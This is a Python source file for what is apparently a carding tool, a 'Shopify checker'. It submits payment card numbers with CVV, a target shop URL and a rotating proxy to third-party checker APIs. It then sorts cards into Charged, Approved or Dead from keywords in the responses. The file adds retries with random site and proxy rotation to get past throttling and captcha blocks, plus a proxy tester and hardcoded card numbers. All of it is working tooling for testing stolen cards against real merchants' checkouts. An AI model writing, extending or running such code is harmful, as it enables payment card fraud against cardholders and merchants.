"""check_engine.py — Shopify checker with selectable multi-key endpoints."""
import asyncio
import aiohttp
import random
import json
import re
import os
from urllib.parse import quote
from config import API_ENDPOINTS_FILE, DEFAULT_API_ENDPOINTS, PROXY_FILE

_error_log_path = "error.txt"

def clear_session_bad_sites():
    pass

def clear_error_log():
    try:
        open(_error_log_path, 'w').close()
    except: pass

def _sanitize(msg) -> str:
    s = re.sub(r'https?://\S+', '[api]', str(msg or ''))
    return s[:100]

def _log_error_card(card, reason):
    try:
        with open(_error_log_path, 'a', encoding='utf-8') as f:
            f.write(f"{card}  # {_sanitize(reason)}\n")
    except: pass

# ══════════════════════════════════════════════════════════
# Fatal site-error detection
# ══════════════════════════════════════════════════════════
_FATAL_SITE_KW = (
    'no_products', 'no products', 'no product',
    'product not found', 'products not found',
    'products_not_found', 'noproducts', 'no_product',
    'payments_zone_not_found', 'zone_not_found', 'zone not found',
    'delivery_delivery_line_detail_changed', 'delivery_line_detail',
    'shop not found', 'store not found',
    'invalid shop', 'invalid store', 'invalid site', 'invalid_shop',
    'site not found', 'store closed', 'shop closed',
    'site_not_found', 'store_not_found',
    'not a shopify', 'not shopify', 'not_shopify',
    'no checkout', 'checkout not found', 'no_checkout',
    'no cart', 'cart not found', 'no_cart',
    'empty cart', 'cart_empty',
    'domain not found', 'domain_not_found',
    'shopify error', 'shopify_error',
    'site_error', 'site error',
)

def _is_fatal_site_error(msg: str) -> bool:
    m = (msg or '').lower()
    return any(k in m for k in _FATAL_SITE_KW)

# ══════════════════════════════════════════════════════════
# API endpoints
# ══════════════════════════════════════════════════════════
def _save_state(d: dict):
    with open(API_ENDPOINTS_FILE, 'w') as f:
        json.dump(d, f, indent=2)

def _norm_ep(ep):
    if isinstance(ep, dict):
        url = (ep.get('url') or '').strip()
        if not url: return None
        key = ep.get('key')
        key = str(key).strip() if key else None
        return {'url': url, 'key': key}
    if isinstance(ep, str) and ep.strip():
        return {'url': ep.strip(), 'key': None}
    return None

def load_api_endpoints() -> dict:
    defaults = [dict(x) for x in DEFAULT_API_ENDPOINTS]
    try:
        with open(API_ENDPOINTS_FILE) as f:
            data = json.load(f)
    except:
        return {'endpoints': defaults, 'active_idx': 0}

    if isinstance(data, list):
        eps = [e for e in (_norm_ep(x) for x in data) if e]
        if not eps: eps = defaults
        return {'endpoints': eps, 'active_idx': 0}

    raw_eps = data.get('endpoints') or []
    eps = [e for e in (_norm_ep(x) for x in raw_eps) if e]
    if not eps: eps = defaults

    active_idx = int(data.get('active_idx', 0) or 0)
    if 'active' in data and isinstance(data['active'], str):
        for i, ep in enumerate(eps):
            if ep['url'] == data['active']:
                active_idx = i; break

    if active_idx < 0 or active_idx >= len(eps):
        active_idx = 0
    return {'endpoints': eps, 'active_idx': active_idx}

def save_api_endpoints(d):
    if isinstance(d, list):
        eps = [e for e in (_norm_ep(x) for x in d) if e]
        cur = load_api_endpoints()
        _save_state({
            'endpoints': eps or cur['endpoints'],
            'active_idx': min(cur['active_idx'], max(0, len(eps) - 1)),
        })
    elif isinstance(d, dict):
        eps = [e for e in (_norm_ep(x) for x in (d.get('endpoints') or [])) if e]
        active = int(d.get('active_idx', 0) or 0)
        if active < 0 or active >= len(eps): active = 0
        _save_state({'endpoints': eps, 'active_idx': active})

def get_active_endpoint() -> dict | None:
    d = load_api_endpoints()
    if not d['endpoints']: return None
    return d['endpoints'][d['active_idx']]

def get_active_idx() -> int:
    return load_api_endpoints()['active_idx']

def add_api_endpoint(url: str, key: str | None = None):
    url = (url or '').strip().rstrip('/')
    if not url.startswith(('http://', 'https://')):
        return False, "URL must start with http:// or https://"
    d = load_api_endpoints()
    nk = key.strip() if key else None
    for ep in d['endpoints']:
        if ep['url'] == url and ep['key'] == nk:
            return False, "Already exists (same URL + key)"
    d['endpoints'].append({'url': url, 'key': nk})
    _save_state(d)
    return True, "Added"

def remove_api_endpoint_by_index(idx: int):
    d = load_api_endpoints()
    if idx < 0 or idx >= len(d['endpoints']):
        return False, "Invalid index"
    if len(d['endpoints']) <= 1:
        return False, "Cannot remove last endpoint"
    removed = d['endpoints'].pop(idx)
    if d['active_idx'] >= len(d['endpoints']):
        d['active_idx'] = len(d['endpoints']) - 1
    elif d['active_idx'] > idx:
        d['active_idx'] -= 1
    _save_state(d)
    return True, f"Removed {removed['url']}"

def remove_api_endpoint_by_url(url: str):
    url = (url or '').strip().rstrip('/')
    d = load_api_endpoints()
    idx = None
    for i, ep in enumerate(d['endpoints']):
        if ep['url'] == url:
            idx = i; break
    if idx is None:
        return False, "Not found"
    return remove_api_endpoint_by_index(idx)

def set_active_endpoint_by_index(idx: int):
    d = load_api_endpoints()
    if idx < 0 or idx >= len(d['endpoints']):
        return False, "Invalid index", None
    d['active_idx'] = idx
    _save_state(d)
    return True, "OK", d['endpoints'][idx]['url']

# ══════════════════════════════════════════════════════════
# Proxy helpers
# ══════════════════════════════════════════════════════════
def normalize_proxy(p: str) -> str:
    p = (p or '').strip()
    if not p: return p
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    if '@' in p: return p
    parts = p.split(':')
    if len(parts) == 2: return p
    if len(parts) == 4:
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return p

def _proxy_to_url(p: str) -> str:
    p = (p or '').strip()
    if not p: return ''
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    if '@' in p: return f'http://{p}'
    parts = p.split(':')
    if len(parts) == 2: return f'http://{p}'
    if len(parts) == 4:
        return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    return f'http://{p}'

def _load_proxies_file():
    try:
        with open(PROXY_FILE) as f:
            return [l.strip() for l in f if l.strip()]
    except: return []

# ══════════════════════════════════════════════════════════
# Result
# ══════════════════════════════════════════════════════════
def _make_result(card, status, message, price='-', gateway='Shopify Payments',
                 receipt_url='', retryable=False, proxy='', time=None, site=None):
    return {
        'status': status, 'message': message, 'card': card,
        'gateway': gateway, 'price': price, 'receipt_url': receipt_url,
        'retry': retryable, 'proxy': proxy, 'time': time, 'site': site,
    }

# ══════════════════════════════════════════════════════════
# URL builder
# ══════════════════════════════════════════════════════════
def _normalize_endpoint_url(url: str) -> str:
    url = (url or '').strip().rstrip('/')
    if not url: return url
    if '://' in url:
        after = url.split('://', 1)[1]
        if '/' not in after:
            return url + '/shopify'
    return url

def _build_check_url(endpoint: dict, site: str, cc: str, proxy: str) -> str:
    url = _normalize_endpoint_url(endpoint.get('url') or '')
    key = endpoint.get('key')
    params = [
        ('site',  quote(site.strip(),  safe=':/?=')),
        ('cc',    quote(cc.strip(),    safe='|')),
        ('proxy', quote(proxy.strip(), safe=':@/')),
    ]
    if key:
        params.append(('key', quote(str(key).strip(), safe='')))
    sep = '&' if '?' in url else '?'
    return f"{url}{sep}{'&'.join(f'{k}={v}' for k, v in params)}"

# ══════════════════════════════════════════════════════════
# Parsing — handles multiple API response shapes
# ══════════════════════════════════════════════════════════
def _extract_json(text: str):
    if not text: return None
    try: return json.loads(text)
    except: pass
    m = re.search(r'\{[\s\S]*\}', text)
    if m:
        try: return json.loads(m.group(0))
        except: pass
    return None

def _parse_bool(v):
    if isinstance(v, bool): return v
    if isinstance(v, str):
        if v.lower() in ('true','yes','1','success','approved','charged'): return True
        if v.lower() in ('false','no','0','fail','failed','error','declined','dead'): return False
    return None

def _extract_price_float(data, depth=0):
    if not isinstance(data, dict) or depth > 3: return None
    for k in ('Price','price','amount','Amount','total','Total',
              'cart_total','order_total','value','ammount'):
        v = data.get(k)
        if v is None or v == '': continue
        try:
            p = float(str(v).replace('$','').replace(',','').replace('USD','').strip())
            if 0 < p < 100000: return p
        except: pass
    for k in ('data','result','order','cart','response','details','payload'):
        sub = data.get(k)
        if isinstance(sub, dict):
            p = _extract_price_float(sub, depth + 1)
            if p is not None: return p
    return None

def _extract_message(data, depth=0):
    if not isinstance(data, dict) or depth > 3: return ''
    for key in ('Response','response','message','msg','reason','error','detail','details','info','note'):
        v = data.get(key)
        if isinstance(v, str) and v.strip(): return v.strip()
    for key in ('data','result','order','cart','payload','body'):
        sub = data.get(key)
        if isinstance(sub, dict):
            m = _extract_message(sub, depth + 1)
            if m: return m
    return ''

def _extract_gateway(data, depth=0):
    if not isinstance(data, dict) or depth > 2: return 'Shopify Payments'
    for key in ('Gateway','gateway','gate','payment_gateway','processor'):
        v = data.get(key)
        if isinstance(v, str) and v.strip(): return v.strip()
    for key in ('data','result','payload'):
        sub = data.get(key)
        if isinstance(sub, dict):
            g = _extract_gateway(sub, depth + 1)
            if g != 'Shopify Payments': return g
    return 'Shopify Payments'

def _extract_receipt(data, depth=0):
    if not isinstance(data, dict) or depth > 2: return ''
    for key in ('receipt_url','receipt','receiptUrl','url','receipt_link'):
        v = data.get(key)
        if isinstance(v, str) and v.startswith('http'): return v
    for key in ('data','result','order','payload'):
        sub = data.get(key)
        if isinstance(sub, dict):
            r = _extract_receipt(sub, depth + 1)
            if r: return r
    return ''

_RETRY_KW = (
    'timeout','timed out','timedout',
    'proxy error','proxy_error','proxy timeout','proxy_timeout',
    'proxy fail','proxy_fail','clienthttpproxyerror',
    'connection refused','connection reset','connection error','connection_error',
    'connectionpool','httpsconnectionpool','httpconnectionpool',
    'network error','network_error',
    'socket','unreachable','no response','no_response',
    'temporary','try again','try_again','retry',
    'rate limit','rate_limit','ratelimit','too many','throttl',
    'processing','pending','in_progress',
    'internal error','internal_error','server error','server_error',
    'bad gateway','service unavailable','gateway timeout',
    'cloudflare','captcha','blocked','forbidden',
)

# ── Expanded charge keywords ─────────────────────────────
_CHARGED_KW = (
    # capture family
    'captur',                        # capture, captured, capturing
    # paid family
    'paid',                          # paid, prepaid, overpaid, order_paid
    # charge family
    'charged',
    # success family (matches successfull, successfully, etc.)
    'success',
    # thank-you
    'thank you',
    # order family
    'order_complete', 'order completed', 'order_completed',
    'order_confirmed', 'order confirmed',
    'order_placed', 'order placed',
    'order_paid', 'order paid',
    'order_success', 'order received',
    # payment family
    'payment_succeeded', 'payment_success',
    'payment_complete', 'payment completed', 'payment_completed',
    'payment_confirmed', 'payment_captured',
    'payment_received', 'payment_processed',
    'payment_done', 'payment_ok',
    # transaction family
    'transaction_complete', 'transaction completed', 'transaction_completed',
    'transaction_success',
    'txn_complete', 'txn_success',
    # checkout family
    'checkout_complete', 'checkout completed', 'checkout_completed',
    'checkout_success',
    # generic completion signals
    'completed', 'fulfilled', 'settled',
)

# ── Negative keywords — force Dead even if charge keyword matched
_NEGATIVE_KW = (
    'unpaid', 'not paid', 'not_paid', 'not  paid',
    'refunded', 'refund', 'reversed', 'voided', 'cancelled',
    'canceled', 'declined', 'failed', 'failure',
    'not completed', 'not_completed', 'incomplete',
)

def _is_negative(msg: str) -> bool:
    m = (msg or '').lower()
    return any(k in m for k in _NEGATIVE_KW)

# ══════════════════════════════════════════════════════════
# Single attempt
# ══════════════════════════════════════════════════════════
async def _try_endpoint(endpoint: dict, shop_url, card, proxy_raw):
    url = _build_check_url(endpoint, shop_url, card, proxy_raw)
    timeout = aiohttp.ClientTimeout(total=60, connect=15, sock_read=50)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
    }
    async with aiohttp.ClientSession(timeout=timeout) as s:
        async with s.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            http_status = r.status
            text = await r.text()

    data = _extract_json(text)

    if http_status != 200:
        msg = _extract_message(data) if isinstance(data, dict) else ''
        retryable = (http_status == 429 or http_status >= 500)
        if _is_fatal_site_error(msg) or _is_fatal_site_error(text[:200]):
            return _make_result(card, 'Dead', msg or text[:100],
                                retryable=False, site=shop_url)
        return _make_result(card, 'Dead', msg or f'HTTP {http_status}',
                            retryable=retryable, site=shop_url)

    # ── Non-JSON response (plain text)
    if not isinstance(data, dict):
        up = (text or '').upper()
        if _is_fatal_site_error(text or ''):
            return _make_result(card, 'Dead', (text or '')[:100],
                                retryable=False, site=shop_url)
        # Negative keywords FIRST — prevents "UNPAID"/"NOT PAID" false positives
        if any(k in up for k in ('UNPAID', 'NOT PAID', 'REFUNDED', 'REFUND',
                                  'REVERSED', 'VOIDED', 'CANCELLED', 'CANCELED')):
            return _make_result(card, 'Dead', (text or '')[:200],
                                retryable=False, site=shop_url)
        # Charge keywords — expanded to match JSON list
        if any(k in up for k in (
            'CHARG', 'PAID', 'CAPTUR', 'SUCCESS',
            'ORDER_PLACED', 'ORDER PLACED',
            'ORDER_COMPLETE', 'ORDER COMPLETE',
            'ORDER_CONFIRMED', 'ORDER CONFIRMED',
            'PAYMENT_COMPLETE', 'PAYMENT COMPLETE',
            'PAYMENT_SUCCESS', 'PAYMENT SUCCESS',
            'TRANSACTION_COMPLETE', 'TRANSACTION COMPLETE',
            'CHECKOUT_COMPLETE', 'CHECKOUT COMPLETE',
            'COMPLETED', 'FULFILLED', 'SETTLED',
        )):
            return _make_result(card, 'Charged', (text or '')[:200],
                                proxy=proxy_raw, site=shop_url)
        if any(k in up for k in ('APPROV', 'LIVE', 'AUTH')):
            return _make_result(card, 'Approved', (text or '')[:200],
                                proxy=proxy_raw, site=shop_url)
        if any(k in up for k in ('DECLIN', 'FAIL', 'DEAD')):
            return _make_result(card, 'Dead', (text or '')[:200],
                                retryable=False, site=shop_url)
        return _make_result(card, 'Dead', 'empty response', retryable=True, site=shop_url)

    # ── Fatal site error inside JSON
    prelim_msg = _extract_message(data)
    if _is_fatal_site_error(prelim_msg):
        price_f = _extract_price_float(data)
        return _make_result(card, 'Dead', prelim_msg,
                            price=f'${price_f:.2f}' if price_f else '-',
                            retryable=False, site=shop_url)

    # ── Normal JSON parse
    status_bool = None
    for k in ('Status','status','success','ok','valid','live'):
        if k in data:
            status_bool = _parse_bool(data[k])
            if status_bool is not None: break

    message  = prelim_msg
    gateway  = _extract_gateway(data)
    receipt  = _extract_receipt(data)
    price_f  = _extract_price_float(data)
    price_s  = f'${price_f:.2f}' if price_f is not None else '-'
    resp_low = (message or '').lower()

    if status_bool is True:
        # Negative guard — even with true status, negative keywords mean decline
        if _is_negative(message):
            return _make_result(card, 'Dead', message,
                                price=price_s, gateway=gateway, retryable=False, site=shop_url)
        if any(k in resp_low for k in _CHARGED_KW):
            return _make_result(card, 'Charged', message or 'Charged',
                                price=price_s, gateway=gateway,
                                receipt_url=receipt, proxy=proxy_raw, site=shop_url)
        return _make_result(card, 'Approved', message or 'Approved',
                            price=price_s, gateway=gateway,
                            receipt_url=receipt, proxy=proxy_raw, site=shop_url)

    if status_bool is False:
        if not message.strip():
            return _make_result(card, 'Dead', 'empty response',
                                price=price_s, retryable=True, proxy=proxy_raw, site=shop_url)
        if any(k in resp_low for k in _RETRY_KW):
            return _make_result(card, 'Dead', message,
                                price=price_s, retryable=True, proxy=proxy_raw, site=shop_url)
        return _make_result(card, 'Dead', message or 'Declined',
                            price=price_s, gateway=gateway, retryable=False, site=shop_url)

    for k in ('charged','paid','captured'):
        if data.get(k) is True:
            return _make_result(card, 'Charged', message or 'Charged',
                                price=price_s, gateway=gateway,
                                receipt_url=receipt, proxy=proxy_raw, site=shop_url)
    if data.get('approved') is True:
        return _make_result(card, 'Approved', message or 'Approved',
                            price=price_s, gateway=gateway, proxy=proxy_raw, site=shop_url)
    if data.get('declined') is True or data.get('success') is False:
        return _make_result(card, 'Dead', message or 'Declined',
                            price=price_s, gateway=gateway, retryable=False, site=shop_url)

    if message:
        if _is_negative(message):
            return _make_result(card, 'Dead', message,
                                price=price_s, gateway=gateway, retryable=False, site=shop_url)
        if any(k in resp_low for k in _CHARGED_KW):
            return _make_result(card, 'Charged', message,
                                price=price_s, gateway=gateway,
                                receipt_url=receipt, proxy=proxy_raw, site=shop_url)
        if any(k in resp_low for k in ('approved','live','auth ok')):
            return _make_result(card, 'Approved', message,
                                price=price_s, gateway=gateway, proxy=proxy_raw, site=shop_url)
        if any(k in resp_low for k in _RETRY_KW):
            return _make_result(card, 'Dead', message,
                                price=price_s, retryable=True, proxy=proxy_raw, site=shop_url)
        return _make_result(card, 'Dead', message,
                            price=price_s, gateway=gateway, retryable=False, site=shop_url)

    return _make_result(card, 'Dead', _sanitize(message) or 'unknown response',
                        price=price_s, retryable=True, site=shop_url)

async def _try_endpoint_safe(endpoint, site, card, proxy):
    try:
        return await _try_endpoint(endpoint, site, card, proxy)
    except asyncio.TimeoutError:
        return _make_result(card, 'Dead', 'timeout', retryable=True, site=site)
    except aiohttp.ClientConnectorError:
        return _make_result(card, 'Dead', 'api unreachable', retryable=True, site=site)
    except aiohttp.ClientPayloadError:
        return _make_result(card, 'Dead', 'payload error', retryable=True, site=site)
    except Exception as e:
        return _make_result(card, 'Dead',
                            f'{type(e).__name__}: {_sanitize(str(e))[:50]}',
                            retryable=True, site=site)

# ══════════════════════════════════════════════════════════
# Card check
# ══════════════════════════════════════════════════════════
async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
    if not sites:
        return _make_result(card, 'Dead', 'No sites configured')
    if not proxies:
        return _make_result(card, 'Dead', 'No proxy configured')

    endpoint = get_active_endpoint()
    if not endpoint:
        return _make_result(card, 'Dead', 'No active API endpoint')

    last_err = ''
    last_site = None
    last_proxy = None

    for round_num in range(3):
        if round_num > 0:
            await asyncio.sleep(2.0 + random.uniform(0, 1.5))

        site  = random.choice(sites)
        proxy = random.choice(proxies)
        last_site = site
        last_proxy = proxy

        result = await _try_endpoint_safe(endpoint, site, card, proxy)
        if result is None:
            last_err = 'no result'
            continue

        msg = result.get('message', '')

        if _is_fatal_site_error(msg):
            return result

        if result['status'] in ('Charged', 'Approved'):
            return result

        if result['status'] == 'Dead' and not result.get('retry'):
            return result

        last_err = msg or 'retryable'

    _log_error_card(card, last_err or 'all_rounds_retryable')
    return _make_result(card, 'Dead', _sanitize(last_err) or 'declined',
                        retryable=False, site=last_site, proxy=last_proxy)

# ══════════════════════════════════════════════════════════
# Site check
# ══════════════════════════════════════════════════════════
_TEST_CARDS = [
    "5154623245618097|03|2032|156",
    "4263982640269299|02|2027|423",
    "4242424242424242|12|2030|123",
]

async def test_site_with_price(site_url: str):
    endpoint = get_active_endpoint()
    if not endpoint:
        return False, None, 'No active endpoint'
    proxies = _load_proxies_file()
    if not proxies:
        return False, None, 'No proxies available'

    last_reason = 'no response'
    found_price = None

    for attempt in range(2):
        if attempt > 0: await asyncio.sleep(2.0)
        proxy     = random.choice(proxies)
        test_card = random.choice(_TEST_CARDS)
        try:
            result = await _try_endpoint(endpoint, site_url, test_card, proxy)
        except asyncio.TimeoutError:
            last_reason = 'API timeout'; continue
        except Exception as e:
            last_reason = f'{type(e).__name__}'; continue
        if not result:
            last_reason = 'empty result'; continue

        price_str = str(result.get('price', '-')).replace('$','').replace(',','').strip()
        if price_str and price_str not in ('-','','None'):
            try:
                p = float(price_str)
                if p > 0: found_price = p
            except: pass

        if _is_fatal_site_error(result.get('message', '')):
            return False, None, result.get('message', 'fatal site error')

        if result['status'] in ('Charged', 'Approved'):
            return True, found_price, 'API OK'
        if result['status'] == 'Dead' and not result.get('retry'):
            return True, found_price, 'API OK (declined)'
        last_reason = result.get('message', 'retryable')

    return False, None, last_reason

async def test_site(site, proxy=None):
    alive, price, reason = await test_site_with_price(site)
    return {'site': site, 'status': 'alive' if alive else 'dead',
            'msg': reason, 'price': price}

# ══════════════════════════════════════════════════════════
# Proxy test
# ══════════════════════════════════════════════════════════
async def test_proxy(proxy: str) -> dict:
    url = _proxy_to_url(proxy)
    if not url:
        return {'proxy': proxy, 'status': 'dead'}
    targets = ['http://httpbin.org/ip','http://api.ipify.org','http://icanhazip.com']
    try:
        timeout = aiohttp.ClientTimeout(total=12, connect=5)
        conn = aiohttp.TCPConnector(ssl=False, limit=100)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
            for u in targets:
                try:
                    async with s.get(u, proxy=url, allow_redirects=True) as r:
                        if r.status == 200:
                            return {'proxy': proxy, 'status': 'alive'}
                except: continue
    except: pass
    return {'proxy': proxy, 'status': 'dead'}

async def get_proxy_ip(proxy: str):
    url = _proxy_to_url(proxy)
    if not url or url.startswith('socks'): return None
    try:
        timeout = aiohttp.ClientTimeout(total=12, connect=5)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get('https://api.ipify.org', proxy=url) as r:
                if r.status == 200: return (await r.text()).strip()
    except: pass
    return None